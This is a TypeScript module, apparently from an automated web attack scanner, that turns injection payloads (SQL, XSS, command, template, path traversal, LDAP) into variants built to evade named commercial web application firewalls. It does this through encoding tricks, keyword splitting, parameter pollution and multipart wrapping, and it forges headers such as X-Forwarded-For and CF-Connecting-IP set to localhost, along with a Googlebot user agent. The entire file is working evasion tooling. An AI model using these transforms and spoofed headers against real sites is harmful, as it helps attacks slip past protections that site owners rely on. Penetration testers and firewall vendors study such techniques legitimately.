/**
 * WAF Evasion Payload Adaptation Layer
 *
 * When the recon WAF detection module identifies a WAF, this module transforms
 * exploit payloads to produce bypass variants. Each WAF profile contains a set
 * of transforms that are applied per vulnerability category.
 *
 * Usage:
 *   const profile = getWafProfile(wafResult.wafName);
 *   const variants = evadePayload(originalPayload, profile, 'sqli');
 *   const headers  = buildEvasionHeaders(profile);
 */

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/** Canonical WAF profiles supported by the evasion layer. */
export type WafProfile =
  | "cloudflare"
  | "aws_waf"
  | "akamai"
  | "imperva"
  | "modsecurity"
  | "generic";

/** Vulnerability categories that evasion transforms can target. */
export type EvasionVulnCategory =
  | "sqli"
  | "xss"
  | "cmdi"
  | "ssti"
  | "path_traversal"
  | "ldap";

/** A single payload transformation function with metadata. */
export interface EvasionTransform {
  /** Short machine-friendly name. */
  name: string;
  /** Human-readable explanation of what the transform does. */
  description: string;
  /** Pure function that rewrites a payload string. */
  transform: (payload: string) => string;
  /** Vulnerability categories this transform is useful for. */
  applicableTo: EvasionVulnCategory[];
}

// ---------------------------------------------------------------------------
// Transform helpers
// ---------------------------------------------------------------------------

function doubleUrlEncode(payload: string): string {
  return payload
    .replace(/'/g, "%2527")
    .replace(/"/g, "%2522")
    .replace(/</g, "%253c")
    .replace(/>/g, "%253e")
    .replace(/ /g, "%2520");
}

function unicodeNormalize(payload: string): string {
  return payload
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/'/g, "\\u0027")
    .replace(/"/g, "\\u0022");
}

function randomizeCase(payload: string): string {
  const keywords = [
    "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "FROM",
    "WHERE", "AND", "OR", "ORDER", "GROUP", "HAVING", "LIMIT", "CONCAT",
    "SCRIPT", "ALERT", "ONERROR", "ONLOAD", "IMG", "SVG",
  ];
  let result = payload;
  for (const kw of keywords) {
    const regex = new RegExp(kw, "gi");
    result = result.replace(regex, (match) =>
      Array.from(match)
        .map((ch, i) => (i % 2 === 0 ? ch.toLowerCase() : ch.toUpperCase()))
        .join(""),
    );
  }
  return result;
}

function insertNullBytes(payload: string): string {
  const keywords = ["select", "union", "script", "alert", "eval"];
  let result = payload.toLowerCase();
  for (const kw of keywords) {
    const idx = result.indexOf(kw);
    if (idx !== -1 && kw.length > 3) {
      const mid = Math.floor(kw.length / 2);
      const replaced = kw.slice(0, mid) + "%00" + kw.slice(mid);
      result = result.slice(0, idx) + replaced + result.slice(idx + kw.length);
    }
  }
  return result;
}

function sqlCommentInject(payload: string): string {
  return payload
    .replace(/SELECT/gi, "SEL/**/ECT")
    .replace(/UNION/gi, "UN/**/ION")
    .replace(/FROM/gi, "FR/**/OM")
    .replace(/WHERE/gi, "WH/**/ERE")
    .replace(/AND/gi, "AN/**/D")
    .replace(/OR(?=\s)/gi, "O/**/R");
}

function whitespaceSubstitute(payload: string): string {
  // Replace spaces with alternating tab, newline, and inline SQL comments
  const replacements = ["\t", "\n", "/**/"];
  let idx = 0;
  return payload.replace(/ /g, () => {
    const r = replacements[idx % replacements.length];
    idx++;
    return r;
  });
}

// ---------------------------------------------------------------------------
// Universal transforms (shared across all WAF profiles)
// ---------------------------------------------------------------------------

const UNIVERSAL_TRANSFORMS: EvasionTransform[] = [
  {
    name: "double_url_encode",
    description: "Double URL-encode special characters to bypass single-decode WAFs",
    transform: doubleUrlEncode,
    applicableTo: ["sqli", "xss", "cmdi", "ssti", "path_traversal", "ldap"],
  },
  {
    name: "unicode_normalization",
    description: "Replace dangerous characters with Unicode escape sequences",
    transform: unicodeNormalize,
    applicableTo: ["xss", "ssti", "ldap"],
  },
  {
    name: "case_randomization",
    description: "Randomize keyword casing to evade case-sensitive signature matching",
    transform: randomizeCase,
    applicableTo: ["sqli", "xss"],
  },
  {
    name: "null_byte_insertion",
    description: "Insert null bytes mid-keyword to break WAF pattern matching",
    transform: insertNullBytes,
    applicableTo: ["sqli", "xss", "cmdi"],
  },
  {
    name: "sql_comment_injection",
    description: "Split SQL keywords with inline comments (SEL/**/ECT)",
    transform: sqlCommentInject,
    applicableTo: ["sqli"],
  },
  {
    name: "whitespace_substitution",
    description: "Replace spaces with tabs, newlines, or SQL comments",
    transform: whitespaceSubstitute,
    applicableTo: ["sqli", "cmdi", "ssti"],
  },
];

// ---------------------------------------------------------------------------
// WAF-specific transforms
// ---------------------------------------------------------------------------

const CLOUDFLARE_TRANSFORMS: EvasionTransform[] = [
  {
    name: "cf_unicode_fullwidth",
    description: "Use Unicode fullwidth characters to bypass Cloudflare HTML filters",
    transform: (payload) =>
      payload
        .replace(/</g, "\uFF1C")
        .replace(/>/g, "\uFF1E")
        .replace(/\(/g, "\uFF08")
        .replace(/\)/g, "\uFF09"),
    applicableTo: ["xss", "ssti"],
  },
  {
    name: "cf_overlong_utf8",
    description: "Overlong UTF-8 encoding for angle brackets (Cloudflare bypass)",
    transform: (payload) =>
      payload
        .replace(/</g, "%C0%BC")
        .replace(/>/g, "%C0%BE")
        .replace(/'/g, "%C0%A7"),
    applicableTo: ["xss", "sqli", "ssti"],
  },
  {
    name: "cf_chunked_hint",
    description: "Wrap payload suggesting chunked transfer encoding bypass",
    transform: (payload) => `0\r\n\r\n${payload}`,
    applicableTo: ["sqli", "xss", "cmdi", "ssti"],
  },
];

const MODSECURITY_TRANSFORMS: EvasionTransform[] = [
  {
    name: "modsec_hpp",
    description: "HTTP Parameter Pollution: duplicate parameter to confuse ModSecurity",
    transform: (payload) => `safe_value&param=${payload}`,
    applicableTo: ["sqli", "xss", "cmdi", "ssti", "path_traversal"],
  },
  {
    name: "modsec_multipart_boundary",
    description: "Multipart boundary manipulation for request body bypass",
    transform: (payload) =>
      `------boundary\r\nContent-Disposition: form-data; name="param"\r\n\r\n${payload}\r\n------boundary--`,
    applicableTo: ["sqli", "xss", "cmdi", "ssti"],
  },
  {
    name: "modsec_mysql_comment_version",
    description: "MySQL versioned comment syntax (/*!50000SELECT*/) for ModSecurity bypass",
    transform: (payload) =>
      payload
        .replace(/SELECT/gi, "/*!50000SELECT*/")
        .replace(/UNION/gi, "/*!50000UNION*/")
        .replace(/FROM/gi, "/*!50000FROM*/"),
    applicableTo: ["sqli"],
  },
];

const AWS_WAF_TRANSFORMS: EvasionTransform[] = [
  {
    name: "aws_json_wrap",
    description: "Wrap payload in JSON body structure (AWS WAF may skip deep JSON inspection)",
    transform: (payload) => JSON.stringify({ data: payload, _nested: { value: payload } }),
    applicableTo: ["sqli", "xss", "cmdi", "ssti"],
  },
  {
    name: "aws_header_casing",
    description: "Manipulate header-style casing in payload to confuse AWS WAF normalization",
    transform: (payload) =>
      payload
        .replace(/Content-Type/gi, "cOnTeNt-TyPe")
        .replace(/Host/gi, "hOsT"),
    applicableTo: ["sqli", "xss", "cmdi", "ssti", "path_traversal", "ldap"],
  },
];

const IMPERVA_TRANSFORMS: EvasionTransform[] = [
  {
    name: "imperva_ip_spoof",
    description: "Payload prefixed with X-Forwarded-For spoofing hint for Imperva bypass",
    transform: (payload) => payload,
    applicableTo: ["sqli", "xss", "cmdi", "ssti", "path_traversal", "ldap"],
  },
  {
    name: "imperva_slow_rate",
    description: "Fragment payload with delay markers for slow-rate evasion",
    transform: (payload) => {
      if (payload.length <= 6) return payload;
      const mid = Math.floor(payload.length / 2);
      return payload.slice(0, mid) + "/**/" + payload.slice(mid);
    },
    applicableTo: ["sqli", "xss", "cmdi"],
  },
];

const AKAMAI_TRANSFORMS: EvasionTransform[] = [
  {
    name: "akamai_double_encode_path",
    description: "Double-encode path separators for Akamai path normalization bypass",
    transform: (payload) =>
      payload
        .replace(/\//g, "%252F")
        .replace(/\.\./g, "%252E%252E"),
    applicableTo: ["path_traversal"],
  },
  {
    name: "akamai_charset_shift",
    description: "Shift characters through alternate charset encoding for Akamai",
    transform: (payload) =>
      payload
        .replace(/'/g, String.fromCharCode(0x02bc))
        .replace(/"/g, String.fromCharCode(0x02ee)),
    applicableTo: ["sqli", "xss"],
  },
];

// ---------------------------------------------------------------------------
// Profile registry
// ---------------------------------------------------------------------------

/** WAF-specific evasion transforms keyed by profile. Each profile includes universal transforms. */
export const WAF_EVASION_PROFILES: Record<WafProfile, EvasionTransform[]> = {
  cloudflare: [...UNIVERSAL_TRANSFORMS, ...CLOUDFLARE_TRANSFORMS],
  aws_waf: [...UNIVERSAL_TRANSFORMS, ...AWS_WAF_TRANSFORMS],
  akamai: [...UNIVERSAL_TRANSFORMS, ...AKAMAI_TRANSFORMS],
  imperva: [...UNIVERSAL_TRANSFORMS, ...IMPERVA_TRANSFORMS],
  modsecurity: [...UNIVERSAL_TRANSFORMS, ...MODSECURITY_TRANSFORMS],
  generic: [...UNIVERSAL_TRANSFORMS],
};

// ---------------------------------------------------------------------------
// WAF name → profile mapping
// ---------------------------------------------------------------------------

const WAF_NAME_MAP: Record<string, WafProfile> = {
  cloudflare: "cloudflare",
  "aws waf": "aws_waf",
  akamai: "akamai",
  imperva: "imperva",
  "imperva / incapsula": "imperva",
  incapsula: "imperva",
  sucuri: "generic",
  "f5 big-ip": "generic",
  modsecurity: "modsecurity",
  fastly: "generic",
  "azure waf": "generic",
  barracuda: "generic",
};

/**
 * Map a WAF name (as returned by the recon WAF detection module) to a
 * canonical WAF evasion profile.
 *
 * @param wafName - The `wafName` field from `WafDetectionResult`, or null if unknown.
 * @returns The matching `WafProfile`, defaulting to `"generic"`.
 */
export function getWafProfile(wafName: string | null): WafProfile {
  if (!wafName) return "generic";
  const key = wafName.toLowerCase().trim();
  return WAF_NAME_MAP[key] ?? "generic";
}

// ---------------------------------------------------------------------------
// Payload evasion
// ---------------------------------------------------------------------------

/**
 * Generate evasion variants for a single payload.
 *
 * Returns the original payload followed by transformed variants that are
 * applicable to the given vulnerability category. Duplicates and no-op
 * transforms (where output equals input) are removed. The result set is
 * capped at 8 variants.
 *
 * @param payload      - The original exploit payload string.
 * @param wafProfile   - The detected WAF profile.
 * @param vulnCategory - The vulnerability category (e.g. `"sqli"`, `"xss"`).
 * @returns An array of 3-8 unique payload variants including the original.
 */
export function evadePayload(
  payload: string,
  wafProfile: WafProfile,
  vulnCategory: string,
): string[] {
  const MAX_VARIANTS = 8;
  const MIN_VARIANTS = 3;

  const transforms = WAF_EVASION_PROFILES[wafProfile] ?? WAF_EVASION_PROFILES.generic;
  const category = vulnCategory as EvasionVulnCategory;

  const seen = new Set<string>();
  const variants: string[] = [];

  // Always include the original payload first
  seen.add(payload);
  variants.push(payload);

  // Apply each applicable transform
  for (const t of transforms) {
    if (variants.length >= MAX_VARIANTS) break;
    if (!t.applicableTo.includes(category)) continue;

    try {
      const transformed = t.transform(payload);
      if (transformed && !seen.has(transformed)) {
        seen.add(transformed);
        variants.push(transformed);
      }
    } catch {
      // Transform failed — skip silently to avoid disrupting the scan
    }
  }

  // If we have fewer than MIN_VARIANTS, try combining transforms to generate more
  if (variants.length < MIN_VARIANTS) {
    const applicable = transforms.filter((t) => t.applicableTo.includes(category));
    for (let i = 0; i < applicable.length && variants.length < MIN_VARIANTS; i++) {
      for (let j = i + 1; j < applicable.length && variants.length < MIN_VARIANTS; j++) {
        try {
          const combined = applicable[j].transform(applicable[i].transform(payload));
          if (combined && !seen.has(combined)) {
            seen.add(combined);
            variants.push(combined);
          }
        } catch {
          // Combined transform failed — skip
        }
      }
    }
  }

  return variants;
}

/**
 * Generate evasion variants for a batch of payloads.
 *
 * Applies `evadePayload` to each input and returns a deduplicated flat array
 * of all variants.
 *
 * @param payloads     - Array of original payload strings.
 * @param wafProfile   - The detected WAF profile.
 * @param vulnCategory - The vulnerability category.
 * @returns Deduplicated array of all evasion variants.
 */
export function evadePayloads(
  payloads: string[],
  wafProfile: WafProfile,
  vulnCategory: string,
): string[] {
  const seen = new Set<string>();
  const results: string[] = [];

  for (const payload of payloads) {
    const variants = evadePayload(payload, wafProfile, vulnCategory);
    for (const v of variants) {
      if (!seen.has(v)) {
        seen.add(v);
        results.push(v);
      }
    }
  }

  return results;
}

// ---------------------------------------------------------------------------
// Evasion headers
// ---------------------------------------------------------------------------

/** Common User-Agent strings that WAFs tend to whitelist. */
const BENIGN_USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
  "Googlebot/2.1 (+http://www.google.com/bot.html)",
];

/**
 * Build HTTP headers that may help bypass the target WAF.
 *
 * Includes a benign User-Agent, localhost X-Forwarded-For, and WAF-specific
 * headers depending on the profile.
 *
 * @param wafProfile - The detected WAF profile.
 * @returns A `Record<string, string>` of evasion headers.
 */
export function buildEvasionHeaders(wafProfile: WafProfile): Record<string, string> {
  const headers: Record<string, string> = {
    "User-Agent": BENIGN_USER_AGENTS[0],
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
  };

  switch (wafProfile) {
    case "cloudflare":
      // Cloudflare sometimes trusts these internal-looking headers
      headers["CF-Connecting-IP"] = "127.0.0.1";
      headers["X-Originating-IP"] = "127.0.0.1";
      break;

    case "aws_waf":
      // JSON content type can cause AWS WAF to route to different rule sets
      headers["Content-Type"] = "application/json";
      headers["X-Amz-Security-Token"] = "";
      break;

    case "akamai":
      headers["True-Client-IP"] = "127.0.0.1";
      headers["X-Forwarded-Host"] = "localhost";
      break;

    case "imperva":
      headers["X-Forwarded-For"] = "10.0.0.1, 127.0.0.1";
      headers["X-Real-IP"] = "10.0.0.1";
      headers["X-Client-IP"] = "127.0.0.1";
      break;

    case "modsecurity":
      // ModSecurity CRS may apply different paranoia levels based on content type
      headers["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundary";
      break;

    case "generic":
    default:
      break;
  }

  return headers;
}
